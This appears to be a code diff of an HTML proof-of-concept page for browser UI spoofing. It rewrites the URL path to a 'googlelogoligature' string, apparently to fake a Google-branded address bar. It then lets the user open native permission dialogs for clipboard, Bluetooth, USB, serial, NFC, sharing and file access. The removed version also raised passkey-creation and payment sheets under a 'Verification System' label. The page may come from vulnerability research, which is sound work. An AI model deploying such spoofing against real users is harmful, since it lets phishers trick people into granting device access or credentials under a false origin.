@@ -1,163 +1,154 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Ultimate UI Spoofing PoC</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UI Spoofing PoC</title>
     <style>
-      body {
-        font-family: sans-serif;
-        background: #202124;
-        color: white;
-        text-align: center;
-        padding: 20px;
-        margin: 0;
-      }
-      h2 { color: #8ab4f8; margin-bottom: 5px; }
-      p { color: #9aa0a6; margin-bottom: 20px; font-size: 14px; }
-      .grid {
-        display: grid;
-        grid-template-columns: 1fr;
-        gap: 15px;
-        max-width: 350px;
-        margin: 0 auto;
-      }
-      .btn {
-        background: #1a73e8;
-        color: white;
-        border: none;
-        padding: 15px 10px;
-        border-radius: 8px;
-        font-weight: bold;
-        cursor: pointer;
-        font-size: 14px;
-        box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-      }
-      .btn:active { background: #1557b0; }
-      .btn-critical { background: #ea4335; } /* Warna merah untuk bottom sheet OS */
-      .btn-critical:active { background: #b31404; }
-      #status { margin-top: 20px; color: #34a853; font-weight: bold; font-size: 14px; }
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h3 {
+            color: #ffffff;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-top: 0;
+        }
+        p { font-size: 14px; color: #888; }
+        
+        .api-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        button {
+            background-color: #1e1e1e;
+            color: #ccc;
+            border: 1px solid #444;
+            padding: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: left;
+            transition: background 0.2s, border-color 0.2s;
+        }
+        button:hover {
+            background-color: #2a2a2a;
+            border-color: #666;
+            color: #fff;
+        }
+        #log-box {
+            margin-top: 25px;
+            padding: 15px;
+            background: #000;
+            border: 1px dashed #555;
+            font-size: 12px;
+            min-height: 60px;
+            color: #0f0;
+            word-wrap: break-word;
+        }
     </style>
-  </head>
-  <body>
-    <h2>Security Verification</h2>
-    <p>Check your address bar, then trigger the modules.</p>
+</head>
+<body>
 
-    <div class="grid">
-      <button class="btn" id="btn-clip">Read Clipboard</button>
-      <button class="btn" id="btn-bt">Bluetooth Device</button>
-      <button class="btn" id="btn-usb">USB Device</button>
+    <h3>Security Module Test</h3>
+    <p>> Init URL path injection...</p>
+    <p>> Select API to trigger OS dialog:</p>
 
-      <button class="btn" id="btn-serial">Web Serial Port</button>
-      <button class="btn" id="btn-hid">Web HID Device</button>
-
-      <button class="btn btn-critical" id="btn-auth">WebAuthn / Passkeys</button>
-      <button class="btn btn-critical" id="btn-pay">Payment Request</button>
-      <button class="btn btn-critical" id="btn-nfc">Web NFC Scan</button>
+    <div class="api-list">
+        <button id="btn-clip">[+] navigator.clipboard.readText()</button>
+        <button id="btn-bt">[+] navigator.bluetooth.requestDevice()</button>
+        <button id="btn-usb">[+] navigator.usb.requestDevice()</button>
+        <button id="btn-serial">[+] navigator.serial.requestPort()</button>
+        <button id="btn-nfc">[+] NDEFReader.scan() (Web NFC)</button>
+        
+        <button id="btn-share">[+] navigator.share() (Share Sheet)</button>
+        <button id="btn-file">[+] window.showOpenFilePicker()</button>
     </div>
 
-    <div id="status"></div>
+    <div id="log-box">waiting for user interaction...</div>
 
     <script>
-      // INJEKSI URL PATH (Fake Omnibox)
-      window.onload = function () {
-        const magicString = "googlelogoligature";
-        const spoofedPath = "/" + magicString + "/secure-module";
-        window.history.replaceState(null, "", spoofedPath);
-      };
+        const logBox = document.getElementById('log-box');
+        const log = (msg) => { 
+            logBox.innerText = `> ${msg}`; 
+            console.log(msg);
+        };
 
-      const statusEl = document.getElementById('status');
-      const log = (msg) => { statusEl.innerText = msg; };
+        // 1. SILENT PATH INJECTION
+        window.onload = function () {
+            const magicString = "googlelogoligature";
+            const spoofedPath = "/" + magicString + "/auth";
+            window.history.replaceState(null, "", spoofedPath);
+        };
 
-      // ==========================================
-      // 1. CONFIRMED VULNERABLE APIs
-      // ==========================================
-      
-      document.getElementById('btn-clip').onclick = async () => {
-        log("Waiting for clipboard prompt...");
-        try {
-            const text = await navigator.clipboard.readText();
-            log("Clipboard Granted!");
-        } catch(e) { log("Clipboard Denied: " + e.message); }
-      };
+        // 2. EVENT LISTENERS
+        document.getElementById('btn-clip').onclick = async () => {
+            log("Triggering clipboard read prompt...");
+            try {
+                await navigator.clipboard.readText();
+                log("SUCCESS: Clipboard access granted.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      document.getElementById('btn-bt').onclick = async () => {
-        log("Opening Bluetooth picker...");
-        try {
-            const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-            log("Bluetooth Granted!");
-        } catch(e) { log("Bluetooth Denied: " + e.message); }
-      };
+        document.getElementById('btn-bt').onclick = async () => {
+            log("Triggering Bluetooth chooser...");
+            try {
+                await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+                log("SUCCESS: Bluetooth device selected.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      document.getElementById('btn-usb').onclick = async () => {
-        log("Opening USB picker...");
-        try {
-            const device = await navigator.usb.requestDevice({ filters: [] });
-            log("USB Granted!");
-        } catch(e) { log("USB Denied: " + e.message); }
-      };
+        document.getElementById('btn-usb').onclick = async () => {
+            log("Triggering USB chooser...");
+            try {
+                await navigator.usb.requestDevice({ filters: [] });
+                log("SUCCESS: USB device selected.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      // ==========================================
-      // 2. NEW HARDWARE CHOOSERS TO TEST
-      // ==========================================
+        document.getElementById('btn-serial').onclick = async () => {
+            log("Triggering Serial Port chooser...");
+            try {
+                await navigator.serial.requestPort();
+                log("SUCCESS: Serial port selected.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      document.getElementById('btn-serial').onclick = async () => {
-        log("Opening Web Serial picker...");
-        try {
-            await navigator.serial.requestPort();
-            log("Serial Port Granted!");
-        } catch(e) { log("Serial Denied: " + e.message); }
-      };
+        document.getElementById('btn-nfc').onclick = async () => {
+            log("Triggering Web NFC scanner...");
+            try {
+                const ndef = new NDEFReader();
+                await ndef.scan();
+                log("SUCCESS: NFC scanner active.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      document.getElementById('btn-hid').onclick = async () => {
-        log("Opening Web HID picker...");
-        try {
-            await navigator.hid.requestDevice({ filters: [] });
-            log("HID Granted!");
-        } catch(e) { log("HID Denied: " + e.message); }
-      };
+        document.getElementById('btn-share').onclick = async () => {
+            log("Triggering Native Share Sheet...");
+            try {
+                await navigator.share({
+                    title: 'Security Sync',
+                    text: 'Synchronize device data',
+                    url: window.location.href
+                });
+                log("SUCCESS: Share sheet opened.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
 
-      // ==========================================
-      // 3. NATIVE BOTTOM SHEETS (CRITICAL)
-      // ==========================================
-
-      document.getElementById('btn-auth').onclick = async () => {
-        log("Opening Biometric/Passkey dialog...");
-        try {
-            const options = {
-                challenge: new Uint8Array(16),
-                rp: { name: "Verification System", id: document.domain },
-                user: { id: new Uint8Array(16), name: "user@example.com", displayName: "User" },
-                pubKeyCredParams: [{alg: -7, type: "public-key"}],
-                timeout: 60000,
-                authenticatorSelection: { authenticatorAttachment: "platform" }
-            };
-            await navigator.credentials.create({ publicKey: options });
-            log("WebAuthn Finished.");
-        } catch(e) { log("WebAuthn Closed: " + e.message); }
-      };
-
-      document.getElementById('btn-pay').onclick = async () => {
-        log("Opening Payment Request sheet...");
-        try {
-            const request = new PaymentRequest(
-                [{ supportedMethods: "basic-card" }], 
-                { total: { label: "Verification Fee", amount: { currency: "USD", value: "0.00" } } }
-            );
-            await request.show();
-            log("Payment Dialog Closed.");
-        } catch(e) { log("Payment Closed: " + e.message); }
-      };
-
-      document.getElementById('btn-nfc').onclick = async () => {
-        log("Waiting for NFC scan dialog...");
-        try {
-            const ndef = new NDEFReader();
-            await ndef.scan();
-            log("NFC Scanner Opened!");
-        } catch(e) { log("NFC Error: " + e.message); }
-      };
-
+        document.getElementById('btn-file').onclick = async () => {
+            log("Triggering Native File Picker...");
+            try {
+                await window.showOpenFilePicker();
+                log("SUCCESS: File picker opened.");
+            } catch(e) { log(`ERR: ${e.message}`); }
+        };
     </script>
-  </body>
+</body>
 </html>
